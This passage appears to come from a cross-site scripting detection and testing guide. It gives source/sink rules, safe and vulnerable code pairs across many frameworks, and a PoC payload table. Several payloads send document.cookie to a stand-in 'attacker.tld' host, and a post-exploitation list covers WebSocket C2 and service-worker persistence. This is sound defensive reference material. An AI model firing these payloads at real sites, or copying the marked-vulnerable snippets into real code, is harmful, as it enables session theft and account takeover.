rg -n "\| ?safe|\| ?raw|innerHTML|v-html|dangerouslySetInnerHTML|th:utext|\{!! ?.* ?!!\}|Html\.Raw" --glob '*{admin,internal,staff,dashboard,report,log}*'
```

**Confirmation is out-of-band (OAST)**: the payload beacons to an attacker-controlled collaborator (e.g. `<img src=//attacker.tld/b?c='+document.cookie>` or a `fetch`) when an internal user opens the view — there is no response to the attacker's own request. PoC must use a callback, not `alert()`.

**SAFE**: contextually encode at **every** render sink regardless of source trust; never treat headers, logs, support tickets, or "internal-only" fields as pre-trusted; apply CSP / Trusted Types to admin and internal apps too (not just the public app). Cross-ref `content_security_policy.md`.

## Special Contexts

### Email

- Most clients strip script elements but permit CSS rules and remote content loading
- Restrict testing to CSS and URL-based techniques where JS execution is not expected

### PDF and Docs

- PDF engines may execute JavaScript inside annotations or form submit actions
- Test `javascript:` in link and submit action fields

### File Uploads

- SVG and HTML files served with `text/html` or `image/svg+xml` content types can execute inline scripts
- Confirm content-type enforcement and `Content-Disposition: attachment` headers
- Watch for MIME sniffing bypasses; require `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session and token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 channel with a constrained command set
- Persistence: service worker registration; localStorage or script gadget re-injection
- Impact paths: role hijack, CSRF chaining, internal port scanning via fetch, credential phishing overlays

## Analysis Workflow

1. **Identify sources** — URL/query/hash/referrer, postMessage, storage, WebSocket, server-injected JSON
2. **Trace to sinks** — Follow data flow from each source to its eventual sink
3. **Classify context** — HTML node, attribute, URL, script block, event handler, eval-like JS, CSS, SVG
4. **Assess defenses** — Output encoding, sanitizer configuration, CSP headers, Trusted Types enforcement, DOMPurify config
5. **Craft payloads** — Minimal context-specific payloads with encoding, whitespace, and casing variants
6. **Multi-channel** — Exercise all transports: REST, GraphQL, WebSocket, SSE, service workers

## Confirming a Finding

1. Supply the minimal payload alongside context (sink type) with before-and-after DOM state or network evidence
2. Demonstrate cross-browser execution where behavior diverges, or explain parser-specific mechanics
3. Show that stated defenses are bypassed — sanitizer settings, CSP headers, Trusted Types — with concrete proof
4. Quantify impact beyond proof-of-concept: data accessed, action performed, persistence achieved

**Dynamic test / PoC signals**

| XSS type | Payload | Expected signal |
|----------|---------|-----------------|
| Reflected (HTML body) | `?q=<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` | Unescaped markup/script in response body; alert or DOM node injection |
| Stored | Submit `<img src=x onerror=fetch('//attacker.tld?c='+document.cookie)>` via profile/comment field; reload as victim | Payload persists and executes for other users |
| Blind (out-of-band) | Inject `<img src=//attacker.tld/b?u='+document.cookie>` via a header (`User-Agent`/`Referer`), support ticket, or signup field that staff later view | OAST callback fires from an internal/admin session; no reflection in attacker's own response |
| DOM-based (hash) | Visit `/#<img src=x onerror=alert(1)>` | Script runs client-side with no server echo; check `location.hash` → sink trace |
| Attribute context | `" autofocus onfocus=alert(1) x="` | Breaks out of quoted attribute; event fires on focus |
| `javascript:` URL | `javascript:alert(1)` in href/src/action param | Navigation or iframe load executes JS |
| Markdown link/image scheme | `[x](javascript:alert(1))`, `![x](data:text/html;base64,…)`, `<javascript:alert(1)>` in a Markdown field | Renderer emits live `href`/`src`; click/load runs JS even with raw HTML disabled |

Use `fetch('//attacker.tld/log?'+document.cookie)` instead of `alert()` for impact PoCs. Capture response Content-Type — HTML sinks require `text/html`; JSON responses are not XSS unless a client parses and injects them.

## Safe Patterns

When these appear immediately before or at the sink, downgrade or exclude:

**Auto-escaping (engine defaults on)**
```jinja2
{{ var }}          {# Jinja2/Django — HTML-escaped #}
```
```html
<%= var %>         <!-- EJS escaped -->
{{ var }}          <!-- Handlebars double-brace -->
= var              <!-- Pug escaped -->
th:text="${var}"   <!-- Thymeleaf -->
@var               <!-- Razor -->
```

**Explicit escaping**
```php
echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8');
```
```ruby
<%= h(var) %>
```
```jsp
<c:out value="${var}"/>
```

**Safe DOM writes**
```javascript
element.textContent = userInput;   // no HTML parsing
element.innerText = userInput;
```

**Allowlist sanitization**
```javascript
element.innerHTML = DOMPurify.sanitize(userInput);
const clean = sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} });
```

**Framework text interpolation (not raw HTML sinks)**
```jsx
return <div>{userInput}</div>;     // React auto-escaped
```
```html
<div>{{ userInput }}</div>         <!-- Angular/Vue interpolation -->
```

## Common False Alarms

- Reflected content that is correctly encoded for the exact context it appears in
- CSP policies enforcing nonces or hashes with no inline events and no dangerous sources
- Trusted Types enforced on all relevant sinks; DOMPurify configured in strict mode with URI allowlists
- Scriptable contexts disabled, raw HTML passthrough prohibited, and safe URL schemes enforced
- `@RestController` returning `application/json` — not an HTML sink
- Express/Fastify handlers setting `Content-Type: application/json` before `send`
- Thymeleaf `th:text` and React `{variable}` text interpolation (not `th:utext` / `dangerouslySetInnerHTML`)
- URI-encoding sanitizer on URL attributes (C# URL sanitizers)
- DOM XSS where data flows only to `textContent`/`innerText`
- JSON/plain-text responses with non-HTML Content-Type; framework auto-escape (`th:text`, React JSX text); DOMPurify/sanitizer barriers; numeric/boolean output

## Business Risk

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining to drive unauthorized state-changing actions
- Malware distribution and phishing via injected content
- Persistent compromise through service worker registration

## Analyst Notes

1. Begin with context classification rather than payload brute force
2. Use DOM instrumentation to log sink activity and uncover unexpected data flows
3. Maintain a small, curated payload set organized by context; iterate with encoding and casing variants
4. Validate defenses by inspecting their configuration and running negative tests
5. Prefer impact-driven PoCs — exfiltration, CSRF chains — over bare alert boxes
6. Treat SVG and MathML as first-class active content; test them independently
7. Rerun tests across different transports and render paths — SSR, CSR, and hydration behave differently
8. Probe CSP and Trusted Types policies intentionally: attempt to violate them and capture the resulting violation reports

## Core Principle

Context and sink together determine whether execution occurs. Encode precisely for the target context, enforce runtime policies through CSP and Trusted Types, and validate every alternative render path. Compact, well-evidenced payloads outperform exhaustive payload catalogs.

## Java Source Detection Rules

### TRUE POSITIVE: Unescaped data in server-generated HTML
- Untrusted data from `@RequestParam`, `request.getParameter(...)`, path variables, headers, or database fields is concatenated or interpolated into HTML markup returned to the browser.
- Java sinks include `ResponseEntity<String>`, `@ResponseBody String`, servlet/JSP writers, or template fragments that build HTML with `String.format(...)`, `+`, or `StringBuilder` without HTML encoding.
- Thymeleaf `th:utext` rendering of untrusted model data is a true positive because it outputs raw HTML.

### TRUE POSITIVE: Stored XSS during HTML rendering
- Data loaded from persistence such as `ResultSet.getString(...)`, entity fields, or repository results is still untrusted when inserted into HTML without contextual encoding.
- A database round-trip does not make the value safe; the finding depends on the final HTML sink.
- `th:text` is only safe for normal HTML text nodes; inside `<script ... th:text="${...}"></script>` or other JavaScript sink contexts it should still be treated as executable `xss`.
- Java handlers that assemble HTML or JavaScript with `StringBuilder`, `String.format`, `append(...)`, or JSP fragments from request or database values are `xss` when the response is browser-rendered, including directory listings and AJAX HTML fragments.

### FALSE POSITIVE: Escaped template output
- Thymeleaf `th:text` escapes HTML by default and should not be flagged unless there is separate evidence that escaping is bypassed or disabled.
- Template output that uses framework HTML escaping is not a finding without a raw-output sink.

### FALSE POSITIVE: JSON-only responses
- `@RestController` responses, Jackson JSON serialization, or `application/json` echoes are not XSS by themselves because they are not HTML or JavaScript rendering sinks.
- Do not report XSS when the only server-side behavior shown is returning JSON or plain data with no browser rendering step.
## Python/JS/PHP Source Detection Rules

### Python (Jinja2 / Flask)
- **VULN**: `render_template_string(user_input)` — template content is user-controlled
- **VULN**: `Markup(user_input)` or `markupsafe.Markup(user_input)` — marks attacker string as safe HTML
- **VULN**: `{{ var | safe }}` in template where `var` comes from a request parameter
- **SAFE**: `render_template('page.html', name=user_input)` — framework auto-escapes variables

### JavaScript (DOM / React / Vue)
- **VULN**: `element.innerHTML = userInput` — direct DOM sink
- **VULN**: `document.write(userInput)`, `element.outerHTML = userInput`
- **VULN**: `dangerouslySetInnerHTML={{ __html: userInput }}` — React explicit unsafe HTML
- **VULN**: `v-html="userInput"` — Vue directive renders raw HTML
- **SAFE**: `element.textContent = userInput`, `element.innerText = userInput`
- **SAFE**: React JSX `<div>{userInput}</div>` — auto-escaped by React

### URL-Scheme Sinks (`javascript:` / `data:` class)
Auto-escaping protects HTML *text/attribute* context but NOT a URL that is later navigated or used as a script/iframe source. Treat any user-controlled value flowing into an href/src/action-like sink as a scheme-injection sink unless the scheme is allowlisted to `http(s)`/`mailto`/`tel`.
- **VULN**: `<a href={userUrl}>` / `window.location = userUrl` / `location.href = userUrl` / `el.src = userUrl` where `userUrl` may be `javascript:...` or `data:text/html,...`
- **VULN**: `<iframe src={userUrl}>`, `<form action={userUrl}>`, `<object data={userUrl}>`, `el.setAttribute('href', userUrl)`
- **VULN**: serving/returning fetched or uploaded **SVG** inline (`image/svg+xml` or `text/html`) — SVG executes inline script; see Image-Proxy SSRF in `ssrf.md`
- **VULN**: the `userUrl` originates from **non-HTTP-request input** — e.g. a URL parsed from a received email/SMTP header (`List-Unsubscribe`) and emitted as an unsubscribe `<a href>` by a webmail UI; the same `javascript:`/`data:` scheme injection applies and the obfuscation variants above (`javascript://host/%0a…`) bypass naive denylists
- **Note**: React blocks `javascript:` in JSX URL props (warns since 16.9), but `data:` URLs, non-React DOM writes, and `setAttribute` still execute; do not assume the framework covers this.
- **SAFE**: validate scheme against an allowlist before use — `if (!/^https?:/i.test(url)) reject()`; React JSX `<div>{userInput}</div>` for non-URL text

### PHP
- **VULN**: `echo $_GET['name']` — no escaping
- **VULN**: `echo $_POST['msg']` — no escaping
- **VULN**: `print $userInput` — no escaping
- **SAFE**: `echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8')`
- **SAFE**: `echo htmlentities($userInput, ENT_QUOTES, 'UTF-8')` — ENT_QUOTES required for attribute contexts (default ENT_COMPAT leaves single quotes unencoded)

## Vulnerable vs Secure Examples

Framework pairs not covered above. Match stack before citing.

### Python — Django

```python
# VULN: mark_safe() bypasses auto-escaping
safe_bio = mark_safe(request.GET.get('bio', ''))

# SECURE: pass raw string; template {{ bio }} auto-escapes
return render(request, 'bio.html', {'bio': request.GET.get('bio', '')})
```

### Node.js — Express (string concat)

```javascript
// VULN: user input in HTML response
res.send(`<h1>Results for: ${req.query.q}</h1>`);

// SECURE: escape manually or use auto-escaping template
const escapeHtml = require('escape-html');
res.send(`<h1>Results for: ${escapeHtml(req.query.q)}</h1>`);
```

### EJS / Handlebars

```html
<!-- VULN -->
<div><%- userInput %></div>
<div>{{{ userInput }}}</div>

<!-- SECURE -->
<div><%= userInput %></div>
<div>{{ userInput }}</div>
```

### Ruby on Rails

```erb
<%# VULN %>
<%= raw(@user.bio) %>
<%= @user.bio.html_safe %>

<%# SECURE %>
<%= @user.bio %>
```

### Java — JSP

```jsp
<%-- VULN --%>
<p>Hello, <%= request.getParameter("name") %></p>
<p>Hello, ${param.name}</p>

<%-- SECURE --%>
<p>Hello, <c:out value="${param.name}"/></p>
```

### Go — html/template

```go
// VULN: text/template or template.HTML() cast bypasses escaping
import "text/template"
name := template.HTML(r.URL.Query().Get("name"))

// SECURE: html/template with plain string — auto-escaped
import "html/template"
tmpl.Execute(w, struct{ Name string }{Name: r.URL.Query().Get("name")})
```

### C# — Razor

```csharp
// VULN
@Html.Raw(userInput)

// SECURE
@userInput
```

### Angular — DomSanitizer bypass

```typescript
// VULN: bypass with user-controlled input
this.sanitizer.bypassSecurityTrustHtml(userInput);

// SECURE: interpolation auto-escapes
// template: <div>{{ userInput }}</div>
```

## Java Servlet Patterns (CWE-79)

**VULN** — tainted input written directly to HTTP response:
```java
PrintWriter out = response.getWriter();
out.println("<p>" + tainted + "</p>");
out.print(tainted);
response.getWriter().println(tainted);
```

**SAFE** — tainted input is HTML-encoded before output:
```java
ESAPI.encoder().encodeForHTML(tainted)
StringEscapeUtils.escapeHtml4(tainted)
```

**Decision rule**: tainted data reaches `PrintWriter.print`/`println`/`write` without encoding → **VULN**. ESAPI or equivalent encoding → **SAFE**.

**Edge cases**:
- `response.getWriter().println(bar.toCharArray())` is **VULN** when `bar` is tainted — converting to `char[]` does not sanitize output.
- `response.getWriter().format(locale, bar, obj)` is **VULN** when `bar` itself is tainted and used as the format string.
- `printf`/`format` with a **fixed** format string is **SAFE** when every inserted argument is fixed or already HTML-encoded.

## Source -> Sink Pattern

**Sources**
- Active threat-model sources — request params, body, headers, cookies (all languages)
- JavaScript reflected: HTTP request input access with third-party controllable inputs; `Referer` header
- JavaScript DOM: `location.hash/search`, `document.referrer`, `postMessage`, storage
- JavaScript stored: filenames, torrent metadata, database reads

**Sinks**
- **Java**: `PrintWriter.print/println/write/format/append`; Spring `@ResponseBody` HTML; JSF/JAX-RS writers; `WebView.loadData`; model sinks `html-injection`, `js-injection`
- **JavaScript reflected**: HTTP response send arguments when Content-Type is HTML-like (`text/html`, `application/xhtml+xml`, `image/svg+xml`, etc.)
- **JavaScript DOM**: `innerHTML`/`outerHTML`, jQuery HTML methods, Angular `$compile`, `document.write`, `setAttribute`, `eval`/`Function`/`setTimeout(string)`, React `dangerouslySetInnerHTML`, `{@html}`, `v-html`
- **JavaScript**: HTML string concat reaching XSS sink; error pages writing tainted data to response
- **Python**: `HttpResponse` body where mimetype is `text/html`
- **C#**: Razor/HTML writers, `Response.Write`, Blazor render fragments; ASP inline `Request.QueryString`
- **Ruby**: ERB output; unsafe HTML construction

**Sanitizers / barriers**
- Java: `HtmlUtils.htmlEscape` (and `html_?escape.*` methods); numeric/boolean types; model `html-injection`/`js-injection` barriers
- JavaScript: HTML metachar `replace` chains; `encodeURI`/`encodeURIComponent`; `JSON.stringify`; JavaScript serialization sanitizer; model `html-injection` barriers
- Python: HTML escaping output (e.g., `html.escape`, MarkupSafe); constant-comparison barriers
- C#: HTML and URL sanitizers; numeric parse; model barriers
- Reflected XSS skips sinks when route sets safe Content-Type (non-HTML MIME)
